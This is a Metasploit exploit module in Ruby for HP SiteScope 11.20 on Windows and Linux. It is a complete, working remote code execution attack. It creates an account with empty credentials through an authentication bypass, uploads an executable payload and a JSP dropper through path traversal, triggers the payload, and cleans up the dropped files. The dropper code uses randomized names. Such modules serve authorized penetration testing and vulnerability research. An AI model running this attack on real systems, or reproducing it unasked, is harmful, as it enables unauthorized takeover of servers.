##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'HP SiteScope Remote Code Execution',
			'Description' => %q{
					This module exploits a code execution flaw in HP SiteScope. It exploits two
				vulnerabilities in order to get its objective. An authentication bypass in the
				create operation, available through the APIPreferenceImpl AXIS service, to create
				a new account with empty credentials and, subsequently, uses the new account to
				abuse the UploadManagerServlet and upload an arbitrary payload embedded in a JSP.
				The module has been tested successfully on HP SiteScope 11.20 over Windows 2003 SP2
				and Linux CentOS 6.3.
			},
			'Author'       =>
				[
					'rgod <rgod[at]autistici.org>', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'License'     => MSF_LICENSE,
			'References'  =>
				[
					[ 'OSVDB', '85121' ],
					[ 'OSVDB', '85151' ],
					[ 'BID', '55269' ],
					[ 'BID', '55273' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-174/' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-175/' ]
				],
			'Privileged'  => true,
			'Platform'    => [ 'win', 'linux' ],
			'Targets'     =>
				[
					[ 'HP SiteScope 11.20 / Windows 2003 SP2',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'win'
						},
					],
					[ 'HP SiteScope 11.20 / Linux CentOS 6.3',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux'
						},
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 29 2012'))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
			], self.class)
	end

	def on_new_session(client)
		if client.type == "meterpreter"
			client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
			client.fs.file.rm("../#{@var_hexfile}.txt")
			client.fs.file.rm("../#{@jsp_name}.jsp")
		else
			if target['Platform'] == 'linux'
				client.shell_command_token("rm ../#{@var_hexfile}.txt")
				client.shell_command_token("rm ../#{@jsp_name}.jsp")
			elsif target['Platform'] == 'win'
				client.shell_command_token("del ..\\#{@var_hexfile}.txt")
				client.shell_command_token("del ..\\#{@jsp_name}.jsp")
			end
		end
	end

	def exploit
		@peer = "#{rhost}:#{rport}"
		@uri = target_uri.path
		@uri << '/' if @uri[-1,1] != '/'

		# Create user with empty credentials
		print_status("#{@peer} - Creating user with empty credentials")

		if create_user.nil?
			print_error("#{@peer} - Failed to create user")
			return
		end

		# Generate an initial JSESSIONID
		print_status("#{@peer} - Retrieving an initial JSESSIONID")
		res = send_request_cgi(
			'uri'    => "#{@uri}servlet/Main",
			'method' => 'POST',
		)

		if res and res.code == 200 and res.headers['Set-Cookie'] =~ /JSESSIONID=([0-9A-F]*);/
			session_id = $1
		else
			print_error("#{@peer} - Retrieve of initial JSESSIONID failed")
			return
		end

		# Authenticate
		login_data = "j_username=&j_password="

		print_status("#{@peer} - Authenticating on HP SiteScope Configuration")
		res = send_request_cgi(
			{
				'uri'    => "#{@uri}j_security_check",
				'method' => 'POST',
				'data'   => login_data,
				'ctype'  => "application/x-www-form-urlencoded",
				'headers' =>
					{
						'Cookie' => "JSESSIONID=#{session_id}",
					}
			})

		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /JSESSIONID=([0-9A-F]*);/
			session_id = $1
			redirect =  URI(res.headers['Location']).path
		else
			print_error("#{@peer} - Authentication on SiteScope failed")
			return
		end

		# Follow redirection to complete authentication process
		print_status("#{@peer} - Following redirection to finish authentication")
		res = send_request_cgi(
			{
				'uri' => redirect,
				'method' => 'GET',
				'headers' =>
					{
						'Cookie' => "JSESSIONID=#{session_id}",
					}
			})

		if not res or res.code != 200
			print_error("#{@peer} - Authentication on SiteScope failed")
			return
		end

		# Upload the JSP and the raw payload
		@jsp_name = rand_text_alphanumeric(8+rand(8))

		# begin <payload>.jsp
		var_hexpath       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_exepath       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_data          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_inputstream   = Rex::Text.rand_text_alpha(rand(8)+8)
		var_outputstream  = Rex::Text.rand_text_alpha(rand(8)+8)
		var_numbytes      = Rex::Text.rand_text_alpha(rand(8)+8)
		var_bytearray     = Rex::Text.rand_text_alpha(rand(8)+8)
		var_bytes         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_counter       = Rex::Text.rand_text_alpha(rand(8)+8)
		var_char1         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_char2         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_comb          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_exe           = Rex::Text.rand_text_alpha(rand(8)+8)
		@var_hexfile      = Rex::Text.rand_text_alpha(rand(8)+8)
		var_proc          = Rex::Text.rand_text_alpha(rand(8)+8)
		var_fperm         = Rex::Text.rand_text_alpha(rand(8)+8)
		var_fdel          = Rex::Text.rand_text_alpha(rand(8)+8)

		jspraw =  "<%@ page import=\"java.io.*\" %>\n"
		jspraw << "<%\n"
		jspraw << "String #{var_hexpath} = application.getRealPath(\"/\") + \"/#{@var_hexfile}.txt\";\n"
		jspraw << "String #{var_exepath} = System.getProperty(\"java.io.tmpdir\") + \"/#{var_exe}\";\n"
		jspraw << "String #{var_data} = \"\";\n"

		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\n"
		jspraw << "#{var_exepath} = #{var_exepath}.concat(\".exe\");\n"
		jspraw << "}\n"

		jspraw << "FileInputStream #{var_inputstream} = new FileInputStream(#{var_hexpath});\n"
		jspraw << "FileOutputStream #{var_outputstream} = new FileOutputStream(#{var_exepath});\n"

		jspraw << "int #{var_numbytes} = #{var_inputstream}.available();\n"
		jspraw << "byte #{var_bytearray}[] = new byte[#{var_numbytes}];\n"
		jspraw << "#{var_inputstream}.read(#{var_bytearray});\n"
		jspraw << "#{var_inputstream}.close();\n"

		jspraw << "byte[] #{var_bytes} = new byte[#{var_numbytes}/2];\n"
		jspraw << "for (int #{var_counter} = 0; #{var_counter} < #{var_numbytes}; #{var_counter} += 2)\n"
		jspraw << "{\n"
		jspraw << "char #{var_char1} = (char) #{var_bytearray}[#{var_counter}];\n"
		jspraw << "char #{var_char2} = (char) #{var_bytearray}[#{var_counter} + 1];\n"
		jspraw << "int #{var_comb} = Character.digit(#{var_char1}, 16) & 0xff;\n"
		jspraw << "#{var_comb} <<= 4;\n"
		jspraw << "#{var_comb} += Character.digit(#{var_char2}, 16) & 0xff;\n"
		jspraw << "#{var_bytes}[#{var_counter}/2] = (byte)#{var_comb};\n"
		jspraw << "}\n"

		jspraw << "#{var_outputstream}.write(#{var_bytes});\n"
		jspraw << "#{var_outputstream}.close();\n"

		jspraw << "if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1){\n"
		jspraw << "String[] #{var_fperm} = new String[3];\n"
		jspraw << "#{var_fperm}[0] = \"chmod\";\n"
		jspraw << "#{var_fperm}[1] = \"+x\";\n"
		jspraw << "#{var_fperm}[2] = #{var_exepath};\n"
		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_fperm});\n"
		jspraw << "if (#{var_proc}.waitFor() == 0) {\n"
		jspraw << "#{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
		jspraw << "}\n"
		# Linux and other UNICES allow removing files while they are in use...
		jspraw << "File #{var_fdel} = new File(#{var_exepath}); #{var_fdel}.delete();\n"
		jspraw << "} else {\n"
		# Windows does not ..
		jspraw << "Process #{var_proc} = Runtime.getRuntime().exec(#{var_exepath});\n"
		jspraw << "}\n"

		jspraw << "%>\n"

		# Specify the payload in hex as an extra file..
		payload_hex = payload.encoded_exe.unpack('H*')[0]

		post_data = Rex::MIME::Message.new
		post_data.add_part(payload_hex, "application/octet-stream", nil, "form-data; name=\"#{rand_text_alpha(4)}\"; filename=\"#{rand_text_alpha(4)}.png\"")

		if target['Platform'] == "linux"
			traversal = "../../../../../../"
		elsif target['Platform'] == "win"
			traversal = "..\\..\\..\\..\\..\\..\\"
		end

		print_status("#{@peer} - Uploading the payload")
		res = send_request_cgi(
			{
				'uri'    => "#{@uri}upload?REMOTE_HANDLER_KEY=UploadFilesHandler&UploadFilesHandler.file.name=#{traversal}#{@var_hexfile}.txt&UploadFilesHandler.ovveride=true",
				'method' => 'POST',
				'data'   => post_data.to_s,
				'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
				'headers' =>
					{
						'Cookie' => "JSESSIONID=#{session_id}",
					}
			})

		if res and res.code == 200 and res.body =~ /file: (.*) uploaded succesfuly to server/
			path = $1
			print_good("#{@peer} - Payload successfully uploaded to #{path}")
		else
			print_error("#{@peer} - Error uploading the Payload")
			return
		end

		post_data = Rex::MIME::Message.new
		post_data.add_part(jspraw, "application/octet-stream", nil, "form-data; name=\"#{rand_text_alpha(4)}\"; filename=\"#{rand_text_alpha(4)}.png\"")

		print_status("#{@peer} - Uploading the JSP")
		res = send_request_cgi(
			{
				'uri'    => "#{@uri}upload?REMOTE_HANDLER_KEY=UploadFilesHandler&UploadFilesHandler.file.name=#{traversal}#{@jsp_name}.jsp&UploadFilesHandler.ovveride=true",
				'method' => 'POST',
				'data'   => post_data.to_s,
				'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
				'headers' =>
					{
						'Cookie' => "JSESSIONID=#{session_id}",
					}
			})

		if res and res.code == 200 and res.body =~ /file: (.*) uploaded succesfuly to server/
			path = $1
			print_good("#{@peer} - JSP successfully uploaded to #{path}")
		else
			print_error("#{@peer} - Error uploading the JSP")
			return
		end

		print_status("Triggering payload at '#{@uri}#{@jsp_name}.jsp' ...")
		send_request_cgi(
			{
				'uri'    => "#{@uri}#{@jsp_name}.jsp",
				'method' => 'GET',
				'headers' =>
					{
						'Cookie' => "JSESSIONID=#{session_id}",
					}
			})
	end

	def create_user

		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
		data << "<wsns0:Envelope" + "\r\n"
		data << "xmlns:wsns1='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
		data << "xmlns:xsd='http://www.w3.org/2001/XMLSchema'" + "\r\n"
		data << "xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'" + "\r\n"
		data << ">" + "\r\n"
		data << "<wsns0:Body" + "\r\n"
		data << "wsns0:encodingStyle='http://schemas.xmlsoap.org/soap/encoding/'" + "\r\n"
		data << ">" + "\r\n"
		data << "<impl:create" + "\r\n"
		data << "xmlns:impl='http://Api.freshtech.COM'" + "\r\n"
		data << ">" + "\r\n"
		data << "<in0" + "\r\n"
		data << "xsi:type='xsd:string'" + "\r\n"
		data << "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
		data << ">UserInstancePreferences</in0>" + "\r\n"
		data << "<in1" + "\r\n"
		data << "xsi:type='apachesoap:Map'" + "\r\n"
		data << "xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'" + "\r\n"
		data << ">" + "\r\n"
		data << "<item" + "\r\n"
		data << "xsi:type='apachesoap:mapItem'" + "\r\n"
		data << ">" + "\r\n"
		data << "<key" + "\r\n"
		data << "xsi:nil='true'" + "\r\n"
		data << "xsi:type='xsd:anyType'" + "\r\n"
		data << "></key>" + "\r\n"
		data << "<value" + "\r\n"
		data << "xsi:nil='true'" + "\r\n"
		data << "xsi:type='xsd:anyType'" + "\r\n"
		data << "></value>" + "\r\n"
		data << "</item>" + "\r\n"
		data << "</in1>" + "\r\n"
		data << "</impl:create>" + "\r\n"
		data << "</wsns0:Body>" + "\r\n"
		data << "</wsns0:Envelope>" + "\r\n"

		res = send_request_cgi({
			'uri'      => "#{@uri}services/APIPreferenceImpl",
			'method'   => 'POST',
			'ctype'    => 'text/xml; charset=UTF-8',
			'data'     => data,
			'headers'  => {
				'SOAPAction'    => '""',
			}})

		if res and res.code == 200 and res.body =~ /createResponse/ and res.body =~ /_id/
			return res
		end

		return nil

	end

end
